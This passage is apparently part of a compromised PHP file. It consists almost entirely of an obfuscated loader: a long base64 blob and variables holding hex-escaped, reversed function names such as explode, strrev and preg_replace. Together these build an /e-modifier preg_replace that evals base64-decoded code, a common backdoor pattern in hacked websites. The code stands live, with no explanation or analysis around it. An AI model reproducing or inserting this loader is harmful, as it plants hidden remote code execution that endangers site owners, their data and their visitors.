hadWtpSTkwelpQSkNLR05sUW05VVNuRkdWczlFVW81VVRzRm1kbDV5VldGWFlXSlhhbGRGVnNGbWRsUkNLdUpFVGpkVVNKOVVXeHRXU0MxVVJYeFdZMlZHSTlBQ2FqRkVUYXRHVkNaRmIxRjNaek4zY3NGbWRsUkNJN2tDTXdnRE14c1NLb1VXYnBSSExwa2lJOTBFU2tobVV6TW1Jb1kwVUNaMlRKZFdZVXgyVFFobVROeFdZMlZHSzFRV2JzYzFVa2QyUWtWVldwVjBVdEZHYmhaWFprZ1NacHQyYnZOR2RsTkhRZ3NISWxOSGJsQlNmN0JTS3BrU1hYTkZabk5FWlZsVmFGTlZiaHhXWTJWR0piVlVTTDkwVEQ5RkpvUVhaek5YYW9BaWN2QlNLcE1rWmpkV1R3WlhhejFrY3NGbWRsUkNJc0lTYXZJQ0l1QVNLMEJGUm85MmNIUm5iRVJIVnNGbWRsUkNJc0lDZmlnU1prOUdidzFXYWc0Q0lpOGlJb2cyWTBGV2JmZFdaeUJIS29ZV2EiKGVkb2NlZF80NmVzYWIobGF2ZScpKTskZXZhbFVkQ1hURFFFUm1XbkRTID0xODc5Mjt9";$eva1tYlbakBcVSir = "\x65\144\x6f\154\x70\170\x65";$eva1tYldakBcVSir = "\x73\164\x72\162\x65\166";$eva1tYldakBoVS1r = "\x65\143\x61\154\x70\145\x72\137\x67\145\x72\160";$eva1tYidokBoVSjr = "\x3b\51\x29\135\x31\133\x72\152\x53\126\x63\102\x6b\141\x64\151\x59\164\x31\141\x76\145\x24\50\x65\144\x6f\143\x65\144\x5f\64\x36\145\x73\141\x62\50\x6c\141\x76\145\x40\72\x65\166\x61\154\x28\42\x5c\61\x22\51\x3b\72\x40\50\x2e\53\x29\100\x69\145";$eva1tYldokBcVSjr=$eva1tYldakBcVSir($eva1tYldakBoVS1r);$eva1tYldakBcVSjr=$eva1tYldakBcVSir($eva1tYlbakBcVSir);$eva1tYidakBcVSjr = $eva1tYldakBcVSjr(chr(2687.5*0.016), $eva1fYlbakBcVSir);$eva1tYXdakAcVSjr = $eva1tYidakBcVSjr[0.031*0.061];$eva1tYidokBcVSjr = $eva1tYldakBcVSjr(chr(3625*0.016), $eva1tYidokBoVSjr);$eva1tYldokBcVSjr($eva1tYidokBcVSjr[0.016*(7812.5*0.016)],$eva1tYidokBcVSjr[62.5*0.016],$eva1tYldakBcVSir($eva1tYidokBcVSjr[0.061*0.031]));$eva1tYldakBcVSir = "";$eva1tYldakBoVS1r = $eva1tYlbakBcVSir.$eva1tYlbakBcVSir;$eva1tYidokBoVSjr = $eva1tYlbakBcVSir;$eva1tYldakBcVSir = "\x73\164\x72\x65\143\x72\160\164\x72";$eva1tYlbakBcVSir = "\x67\141\x6f\133\x70\170\x65";$eva1tYldakBoVS1r = "\x65\143\x72\160";$eva1tYldakBcVSir = "";$eva1tYldakBoVS1r = $eva1tYlbakBcVSir.$eva1tYlbakBcVSir;$eva1tYidokBoVSjr = $eva1tYlbakBcVSir;} ?>
}